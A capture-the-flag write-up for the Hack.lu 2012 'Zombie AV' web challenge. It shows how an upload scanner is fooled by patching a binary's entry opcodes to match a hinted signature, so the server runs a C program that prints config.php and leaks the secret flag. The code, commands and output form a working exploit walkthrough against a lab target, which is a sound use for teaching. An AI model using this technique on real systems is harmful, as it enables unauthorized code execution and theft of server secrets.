---
title: "Hack.lu CTF 2012 - Zombie AV"
tags:
  - hackyou2012
  - writeup
  - web
---

Some people try to fight the zombie apocalypse by selling pseudo antidote. We
need the secret formula in config.php to destroy their snake oil business...

Source: http://dl.ctftime.org/38/119/zombieav.zip

Page: https://ctf.fluxfingers.net:2070

Basically we just want to read the config.php file for the $secret.

From the sample config.php in the zip file:

```php
<?php

$readelfpath='/usr/bin/readelf';
$objdumppath='/usr/bin/objdump';
$uploadpath='upload/';
$scriptpath='/var/www/';
$secret='______________________';

?>
```

Uploading any random binary shows us this:

```
analysing file 3fe6e0634a9977050ac1f9d67e4edc59
8048330: 31 ed xor %ebp,%ebp
8048332: 5e pop %esi
8048333: 89 e1 mov %esp,%ecx
8048335: 83 e4 f0 and $0xfffffff0,%esp
8048338: 50 push %eax
8048339: 54 push %esp
804833a: 52 push %edx
804833b: 68 b0 84 04 08 push $0x80484b0
8048340: 68 50 84 04 08 push $0x8048450
8048345: 51 push %ecx
8048346: 56 push %esi
8048347: 68 04 84 04 08 push $0x8048404
804834c: e8 bf ff ff ff call 8048310 <__libc_start_main@plt>
8048351: f4 hlt
8048352: 90 nop
8048353: 90 nop
8048354: 55 push %ebp
80483
Entry Opcodes are: 31 ed 5e 89 e1 83 e4 f0 50 54 52 68
Signature is: d87ae7dd8b166d8e2c02676d69561c96
no zombie virus found
```

No luck, its not the binary they're looking for. Taking a look at scan.php which
does the scanning, we see:

```php
$opcodes=getOpcodes($rest);
print "Entry Opcodes are: ".$opcodes;
print "n";
print "Signature is: " . md5($opcodes);
print "n";
```

So we see that getOpcodes() extracts exactly "31 ed 5e 89 e1 83 e4 f0 50 54 52
68" this much of hex from the binary. And scan.php does the matching by
`md5($opcodes) === 'cd53b957ec552afb39cba6daed7a9abc'`. All we need to do is get
scan.php to read the correct $opcodes that generates the desired md5sum.

There is a huge hint in the php file that tells us what opcodes generates the
desired md5sum.

```
/*
* hint: zombie virus signature is
* 8048340: b0 01 mov $0x1,%al
* 8048342: 90 nop
* 8048343: 90 nop
* 8048344: 90 nop
* 8048345: 90 nop
* 8048346: 90 nop
* 8048347: 90 nop
* 8048348: 90 nop
* 8048349: 90 nop
* 804834a: cd 80 int $0x80
*/
```

After passing the md5sum comparison check, scan.php executes the uploaded binary
and displays the output as shown in the source below. We can make use of this.

```php
if (md5($opcodes) === 'cd53b957ec552afb39cba6daed7a9abc') {
    print "found zombie virus, trying to execute itn";
    chmod($filename,755);

    $handle = popen($filename.' 2>&1', 'r');

    while (!feof($handle)) {
        $read .= fread($handle, 8192);
    }

    pclose($handle);

    print $read;
    @unlink($filename);
    print "done we are safen";
} else {
    print "no zombie virus found";
}

}
```

So we just need the uploaded binary to cat or read config.php and scan.php will
automagically display the contents.

The following C code does just that.

```c
#include <stdio.h>
#include <stdlib.h>

int main( int argc, char *argv[]){
    char *path[] = {"/bin/cat", "config.php", NULL};
    execve("/bin/cat", path, NULL);

}
```

Compile it.

```shell
gcc -m32 -o prepay.elf test.c
```

After compiling, we just need to patch the binary, changing "31 ed 5e 89 e1 83
e4 f0 50 54 52 68" to "b0 01 90 90 90 90 90 90 90 90 cd 80". Fire up your hex
editor, search for hex "31 ed" blah, change it to "b0 01" blah. Save and upload
to Zombie AV.

```shell
analysing file 513160765dcc3d61a6cadd9c487ca00e
8048330: b0 01 mov $0x1,%al
8048332: 90 nop
8048333: 90 nop
8048334: 90 nop
8048335: 90 nop
8048336: 90 nop
8048337: 90 nop
8048338: 90 nop
8048339: 90 nop
804833a: cd 80 int $0x80
804833c: b0 84 mov $0x84,%al
804833e: 04 08 add $0x8,%al
8048340: 68 50 84 04 08 push $0x8048450
8048345: 51 push %ecx
8048346: 56 push %esi
8048347: 68 04 84 04 08 push $0x8048404
804834c: e8 bf ff ff ff call 8048310 <__libc_start_main@plt>
8048351: f4 hlt
8048352: 90
Entry Opcodes are: b0 01 90 90 90 90 90 90 90 90 cd 80
Signature is: cd53b957ec552afb39cba6daed7a9abc
found zombie virus, trying to execute it
<?php

$readelfpath='/usr/bin/readelf';
$objdumppath='/usr/bin/objdump';
$uploadpath='upload/';
$scriptpath='/var/www/';
$secret='55c4080daefb5f794c3527101882b50b';

?>
done we are safe
```
Automagically `$secret='55c4080daefb5f794c3527101882b50b';`

Flag: **55c4080daefb5f794c3527101882b50b**.
